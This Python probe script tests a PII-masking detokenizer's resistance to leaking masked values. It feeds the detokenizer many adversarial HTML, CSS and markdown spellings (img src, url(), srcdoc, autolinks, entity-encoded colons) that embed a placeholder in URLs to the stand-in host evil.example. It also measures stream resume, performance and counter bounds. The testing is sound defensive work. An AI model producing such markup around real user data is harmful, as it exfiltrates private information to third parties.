"""Reviewer probe for 08-tam-1a r4 (4aecdbc), run inside the review08t1a backend container after
08-tam-1a-r3-probe.py (which re-checks the r2/r3 table): the r3 adversarial spellings, the new
spellings K-08T1-0022 asks for, the blank line rule (KARARLAR ek (e)), the reader that starts
`after` an entry (ek (d), assumption 12) on a real Redis stream, its cost, the incremental scan
(ek (c)) and the 99,999,998 bound (ek (f)).

docker exec -w /app -e PYTHONPATH=/app review08t1a-backend-1 python /tmp/probe08r4.py
Values are synthetic (example.test); nothing secret is printed.
"""

import asyncio
import json
import time
import uuid

from ffcore.api.runs import detokenizer
from ffcore.core.config import get_settings
from ffcore.guardrails import masking
from ffcore.runtime.contracts import SseEvent
from ffcore.runtime.events import redis_client, stream_key

VALUE = "ali@example.test"


async def modes(store, scope, text):
    one, _, _ = await masking.reveal_text(text, store=store, scope=scope)
    res = [("one", VALUE in one)]
    for size in (1, 7, 50):
        det = masking.StreamDetokenizer(store, scope)
        out = ""
        for i in range(0, len(text), size):
            out += await det.feed(text[i : i + size])
        out += await det.flush()
        res.append((f"stream{size}", VALUE in out))
    # live entries are whole placeholders (the writer's aligner): split on whitespace
    cr = masking.ContextReveal(store, scope)
    live = ""
    for piece in text.split(" "):
        live += (await cr.data({"text": piece + " "}, stream_text=True))["text"]
    res.append(("live", VALUE in live))
    return " ".join(f"{k}={'REVEALED' if v else 'kept'}" for k, v in res)


async def shapes(store, tok):
    cases = {
        # r3 adversarial (MAJOR-r3-1)
        "src NL =": f'<img src\n="http:evil.example/?q={tok}">',
        "src NL = NL": f'<img src\n=\n"http:evil.example/?q={tok}">',
        "style url http:": f'<span style="background:url(http:evil.example/?q={tok})">x</span>',
        "object data http:": f'<object data="http:evil.example/?q={tok}"></object>',
        # K-08T1-0022 new spellings
        "a NL href": f'<a\nhref="http:evil.example/?q={tok}">x</a>',
        "svg image href": f'<svg><image href="//evil.example/{tok}"/></svg>',
        "url( 'http:' )": f"<div style=\"background: url( 'http:evil.example/{tok}' )\">",
        "IMG SRC upper": f"<IMG SRC=http:evil.example/{tok}>",
        "entity colon attr": f'<img src="http&#x3a;//evil.example/{tok}">',
        "entity colon md": f"![x](http&#x3a;evil.example/{tok})",
        # more
        "tag over 3 lines": f'<img\n  alt="x"\n  src="http:evil.example/{tok}">',
        "tag value after blank": f'<img src="https://evil.example/?q=\n\n{tok}">',
        "unquoted after NL in tag": f"<img\nsrc=\nhttp:evil.example/{tok}>",
        "css block": f"<style>\nbody {{ background: url(http:evil.example/{tok}) }}\n</style>",
        "srcdoc": f'<iframe srcdoc="<img src=http:evil.example/{tok}>"></iframe>',
        "md autolink scheme": f"<http:evil.example/{tok}>",
        "md ref def angle": f"![x][1]\n\n[1]: <evil.example/{tok}>",
        "md ( NL NL value (not a link)": f"![x](https://evil.example/?q=\n\n{tok})",
        "md ( NL value": f"![x](https://evil.example/?q=\n{tok})",
        # usability
        "plain": f"Kişi {tok} idi.",
        "plain after closed tag line": f"<b>Not</b>\nKişi {tok} idi.",
        "math a<b same line": f"a<b ve Kişi {tok} idi.",
        "prose data: same line": f"data: Kişi {tok} idi.",
        "after unclosed HTML quote, 3 lines later": f'x <a title="açık\nbir\niki\nKişi {tok} idi.',
        "after md target + blank": f"[a](https://x.example/(\n\nKişi {tok} idi.",
    }
    for name, text in cases.items():
        print(f"SHAPE {name}: {await modes(store, 's', text)}")


async def resume():
    settings = get_settings()
    redis = redis_client(settings)
    store = masking.RedisTokenStore(redis, 120)
    results = {}

    async def scenario(name, entries, after_index, follow):
        run_id = uuid.uuid4()
        tok = await store.token_for(str(run_id), "EMAIL_ADDRESS:" + VALUE, VALUE)
        key = stream_key(run_id)
        ids = []
        for i, text in enumerate(entries, start=1):
            eid = f"1-{i}"
            await redis.xadd(key, {"event": "token", "data": json.dumps({"text": text.format(tok=tok)})}, id=eid)
            ids.append(eid)
        after = ids[after_index] if after_index is not None else "9-9"
        hook = detokenizer(redis, run_id, after=after)
        out = await hook({"text": follow.format(tok=tok)}, SseEvent.token)
        results[name] = "REVEALED" if VALUE in out["text"] else "kept"
        await redis.delete(key, "ffcore:pii:" + str(run_id), "ffcore:pii:n:" + str(run_id))

    await scenario("r3 MINOR-r3-1 (md target split, reconnect)", ["Bak: ", "![x](https://evil.example/?q="], 1, "{tok})")
    await scenario("owner after approval, new line", ["Onay bekliyor.\n"], 0, "Kişi {tok} idi.")
    await scenario("owner after approval, same plain line", ["Kişi kaydı "], 0, "{tok} idi.")
    await scenario("HTML value opened two lines earlier", ['<img src="https://evil.example/?q=\n', "abc\n"], 1, '{tok}">')
    await scenario("after id not in stream (fail-closed)", ["Kişi "], None, "{tok} idi.")
    for name, r in results.items():
        print(f"RESUME {name}: {r}")

    # cost of priming: a long approved run, many token entries before `after`
    for n in (2000, 20000):
        run_id = uuid.uuid4()
        key = stream_key(run_id)
        pipe = redis.pipeline()
        for i in range(1, n + 1):
            pipe.xadd(key, {"event": "token", "data": json.dumps({"text": "kelime "})}, id=f"1-{i}")
        await pipe.execute()
        hook = detokenizer(redis, run_id, after=f"1-{n}")
        t0 = time.perf_counter()
        await hook({"text": "son "}, SseEvent.token)
        print(f"PRIME cost {n} token entries: {time.perf_counter() - t0:.3f} s")
        await redis.delete(key)
    await redis.aclose()


async def perf(store):
    for n, size, label in (
        (100_000, 1, "one line, no marker"),
        (64_000, 4, "one line, no marker"),
        (100_000, 1, "one line, marker at start"),
    ):
        text = ("](x " if "marker" in label and "no" not in label else "") + "a" * n
        for cls in ("StreamDetokenizer", "ContextReveal"):
            t0 = time.perf_counter()
            if cls == "StreamDetokenizer":
                d = masking.StreamDetokenizer(store, "s")
                for i in range(0, len(text), size):
                    await d.feed(text[i : i + size])
            else:
                c = masking.ContextReveal(store, "s")
                for i in range(0, len(text), size):
                    await c.data({"text": text[i : i + size]}, stream_text=True)
            print(f"PERF {cls} {label} {n} chars, {size}-char chunks: {time.perf_counter() - t0:.2f} s")
    text = ("word " * 12 + "\n") * 2000
    for pat, label in (("<b>x</b> ", "every line has a tag"), ("src ", "every piece ends with an attribute name")):
        t = (pat * 20 + "\n") * 2000
        c = masking.ContextReveal(store, "s")
        t0 = time.perf_counter()
        for i in range(0, len(t), 4):
            await c.data({"text": t[i : i + 4]}, stream_text=True)
        print(f"PERF ContextReveal {label} {len(t)} chars, 4-char chunks: {time.perf_counter() - t0:.2f} s")
    c = masking.ContextReveal(store, "s")
    t0 = time.perf_counter()
    for i in range(0, len(text), 4):
        await c.data({"text": text[i : i + 4]}, stream_text=True)
    print(f"PERF ContextReveal plain prose {len(text)} chars: {time.perf_counter() - t0:.2f} s")


async def bounds():
    settings = get_settings()
    redis = redis_client(settings)
    store = masking.RedisTokenStore(redis, 60)
    scope = f"probe-bound-{uuid.uuid4().hex[:8]}"
    await masking.reserve_carried(store, scope, "Bkz <<PII_99999997>>")
    print("BOUND reserve 99999997 -> next", await store.token_for(scope, "EMAIL:a@example.test", "a@example.test"))
    print("BOUND then", await store.token_for(scope, "EMAIL:b@example.test", "b@example.test"))
    try:
        print("BOUND then", await store.token_for(scope, "EMAIL:c@example.test", "c@example.test"))
    except Exception as exc:  # noqa: BLE001 - the probe reports what happens
        print("BOUND third ->", type(exc).__name__, getattr(exc, "code", ""), getattr(exc, "status", ""))
    for carried in ("<<PII_99999998>>", "<<PII_99999999>>", "<<PII_100000000>>"):
        s2 = f"{scope}-{carried[6:-2]}"
        try:
            await masking.reserve_carried(store, s2, f"Bkz {carried}")
            print(f"BOUND reserve_carried {carried}: ok, next", await store.token_for(s2, "EMAIL:d@example.test", "d@example.test"))
        except Exception as exc:  # noqa: BLE001
            print(f"BOUND reserve_carried {carried}: {type(exc).__name__} {getattr(exc, 'code', '')}")
        await redis.delete("ffcore:pii:" + s2, "ffcore:pii:n:" + s2)
    mem = masking.MemoryTokenStore()
    mem._scopes["s9"] = {"t:<<PII_100000000>>": "x@example.test"}
    out, unresolved, _ = await masking.reveal_text("Kişi <<PII_100000000>>", store=mem, scope="s9")
    print("BOUND 9-digit reveal ->", repr(out), "unresolved", unresolved)
    await redis.delete("ffcore:pii:" + scope, "ffcore:pii:n:" + scope)
    await redis.aclose()


async def main():
    store = masking.MemoryTokenStore()
    tok = await store.token_for("s", "EMAIL_ADDRESS:" + VALUE, VALUE)
    await shapes(store, tok)
    await resume()
    await perf(store)
    await bounds()


asyncio.run(main())
